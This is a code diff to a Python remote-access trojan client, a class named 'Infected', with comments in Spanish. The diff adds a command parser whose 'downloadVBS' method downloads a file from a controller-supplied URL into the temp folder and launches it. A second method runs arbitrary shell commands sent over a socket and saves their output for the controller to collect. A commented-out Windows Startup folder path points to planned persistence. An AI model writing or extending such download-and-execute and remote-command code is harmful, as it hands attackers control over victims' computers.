@@ -2,6 +2,26 @@ import socket
 from time import sleep
 import os
 import tempfile
+import urllib.request
+
+
+class ParserInfected:
+    
+    def getCommand(self, data):
+        dataAux = data.split(" @ ")
+        return getattr(self, dataAux[0])(dataAux)
+        
+    
+    def downloadVBS(self, listOfParameters):
+        #Descargar
+        url = listOfParameters[1]
+        #path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" PASARLO a VBS
+        urllib.request.urlretrieve (url,  tempfile.gettempdir()+"/" + listOfParameters[2])
+        #Ejecutar
+        return "start "+ tempfile.gettempdir() +"/"+ listOfParameters[2], not listOfParameters[3].startswith("T")
+        
+    def nativeCommand(self, listOfParameters):
+        return listOfParameters[1]+" > "+ tempfile.gettempdir() +"/file.txt", not listOfParameters[2].startswith("T")
 
 class Infected:
 
@@ -11,6 +31,7 @@ class Infected:
         self.portSendOutput = portSendOutput
         self.lastAction = "None"
         self.isNotFinish = True
+        self.parser = ParserInfected()
         
     def getDataFromSocket(self, socket):
         return socket.recv(2000).decode("utf-8")
@@ -37,13 +58,11 @@ class Infected:
             else:
                 sleep(10)
     
-    def executeAction(self, action):
-        actionAux = action.split(" @ ")
-        action = actionAux[0] + " > %tmp%/file.txt"
-        self.isNotFinish = not actionAux[1].startswith("T")
-        print(action)        # porque este print?
-        os.system(action)  
-        self.sendOutput() # se cambia por output mas adelante
+    def executeAction(self, data):
+        command, end = self.parser.getCommand(data)
+        self.isNotFinish = end
+        os.system(command)  
+        self.sendOutput()
     
     def readCommand(self):
         
